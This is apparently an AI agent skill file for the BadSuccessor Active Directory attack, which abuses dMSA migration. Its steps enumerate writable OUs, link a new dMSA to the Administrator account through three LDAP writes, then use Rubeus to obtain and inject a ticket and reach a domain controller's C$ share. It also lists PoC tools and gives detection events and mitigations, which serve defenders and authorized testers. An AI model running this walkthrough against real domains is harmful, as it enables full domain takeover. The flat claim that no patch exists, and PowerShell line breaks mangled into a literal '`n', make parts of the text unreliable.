---
name: badsuccessor-ad-exploitation
description: Active Directory security assessment skill for the BadSuccessor privilege escalation technique. Use this skill when users are conducting authorized AD penetration testing, security assessments, or want to understand the dMSA migration abuse vulnerability. Trigger when users mention: Active Directory privilege escalation, dMSA/Delegated MSA, service account migration abuse, AD security testing, or when they need to enumerate vulnerable OUs for delegated service account creation.
---

# BadSuccessor: Privilege Escalation via Delegated MSA Migration Abuse

> **⚠️ WARNING**: This skill is for **authorized security testing only**. Ensure you have explicit written permission before testing any Active Directory environment. Unauthorized use may violate laws and policies.

## Overview

The **BadSuccessor** technique exploits a vulnerability in Windows Server 2025's Delegated Managed Service Accounts (dMSA) migration workflow. When an attacker can create dMSA objects in an OU and manipulate specific LDAP attributes, they can inherit privileges from any linked account—including Domain Admin.

### How It Works

1. Attacker creates a dMSA in a writable OU
2. Sets `msDS-ManagedAccountPrecededByLink` to point to a high-privilege account
3. Sets `msDS-DelegatedMSAState` to `2` (completed)
4. Authenticates as the dMSA and receives the linked account's token

**No security patch exists** as of 2025. Only OU permission hardening mitigates this.

## Prerequisites

Before attempting this technique, verify:

- [ ] You have **explicit authorization** to test the target environment
- [ ] Your account can create objects in at least one OU
- [ ] You have network access to LDAP and Kerberos services
- [ ] You understand the legal and ethical implications

### Required Permissions

Your account needs one of:
- `Create Child` → `msDS-DelegatedManagedServiceAccount` object class
- `Create Child` → `All Objects` (generic create permission)

## Step 1: Enumerate Vulnerable OUs

Use the enumeration script to find OUs where you can create dMSA objects:

```bash
# Run the enumeration script
python scripts/enumerate-badsuccessor-ous.py -domain contoso.local -username user -password pass
```

Or use PowerShell if you have the Unit 42 helper:

```powershell
Get-BadSuccessorOUPermissions.ps1 -Domain contoso.local
```

The script checks each OU's `nTSecurityDescriptor` for:
- `ADS_RIGHT_DS_CREATE_CHILD` (0x0001)
- Object class: `msDS-DelegatedManagedServiceAccount` (GUID: 31ed51fa-77b1-4175-884a-5c6f3f6f34e8)

### Interpreting Results

- **Vulnerable OU**: You can create dMSA objects here
- **Target Account**: Any account you can link to (Administrator, Domain Admins members, etc.)
- **Risk Level**: Higher if the OU is writable by low-privilege accounts

## Step 2: Exploitation

Once you've identified a vulnerable OU, the attack requires only 3 LDAP writes:

### Method A: PowerShell (if you have AD module)

```powershell
# 1. Create the dMSA in the vulnerable OU
New-ADServiceAccount -Name attacker_dMSA `n                     -DNSHostName host.contoso.local `n                     -Path "OU=VulnerableOU,DC=contoso,DC=com"

# 2. Link to the target account (e.g., Administrator)
Set-ADServiceAccount attacker_dMSA -Add `n    @{msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=contoso,DC=com"}

# 3. Mark migration as completed
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```

### Method B: Using Public Tools

Several PoCs automate this workflow:

| Tool | Language | Purpose |
|------|----------|----------|
| [SharpSuccessor](https://github.com/logangoins/SharpSuccessor) | C# | Full exploitation + password retrieval |
| [BadSuccessor.ps1](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1) | PowerShell | Scripted exploitation |
| [NetExec badsuccessor](https://github.com/Pennyw0rth/NetExec) | Python | Module for nxc |

## Step 3: Post-Exploitation

After the dMSA is configured, authenticate and use the inherited privileges:

```powershell
# Request TGT for the dMSA (Rubeus)
Rubeus asktgt /user:attacker_dMSA$ /password:<ClearTextPwd> /domain:contoso.local

# Inject the ticket
Rubeus ptt /ticket:<Base64TGT>

# Verify you have the expected privileges
whoami /all

# Access Domain Admin resources
dir \\DC01\C$
```

## Detection & Hunting

### Windows Security Events to Monitor

| Event ID | Description | Key Details |
|----------|-------------|-------------|
| **5137** | dMSA object creation | Look for `msDS-DelegatedManagedServiceAccount` |
| **5136** | Attribute modification | `msDS-ManagedAccountPrecededByLink` changes |
| **4662** | Specific attribute access | GUIDs below |
| **2946** | TGT issuance | For the dMSA account |

### Critical Attribute GUIDs

- `2f5c138a-bd38-4016-88b4-0ec87cbb4919` → `msDS-DelegatedMSAState`
- `a0945b2b-57a2-43bd-b327-4d112a4e8bd1` → `msDS-ManagedAccountPrecededByLink`

### Detection Query Pattern

Correlate these events to identify BadSuccessor activity:

1. **4741** (computer/service account creation) → **4662** (attribute modification) → **4624** (logon)
2. Alert on non-Tier-0 identities creating or editing dMSAs
3. Monitor for dMSA objects linking to high-privilege accounts

### XDR Solutions

XSIAM and similar platforms have ready-to-use queries for this technique.

## Mitigation Recommendations

### Immediate Actions

1. **Audit OU Permissions**: Remove `Create Child` / `msDS-DelegatedManagedServiceAccount` from OUs that don't need it
2. **Apply Least Privilege**: Only delegate service account management to trusted roles
3. **Enable Object Auditing**: On all OUs where dMSAs could be created

### Long-term Hardening

- Implement tiered administration (Tier 0, 1, 2)
- Regular permission audits using tools like `Get-BadSuccessorOUPermissions.ps1`
- Alert on dMSA creation/modification by non-administrative accounts
- Consider disabling dMSA creation entirely if not needed

## References

- [Unit42 – When Good Accounts Go Bad](https://unit42.paloaltonetworks.com/badsuccessor-attack-vector/)
- [SharpSuccessor PoC](https://github.com/logangoins/SharpSuccessor)
- [BadSuccessor.ps1](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)
- [NetExec BadSuccessor Module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)

## Related Techniques

- Golden dMSA/gMSA attacks
- Service account credential theft
- Kerberos TGT manipulation
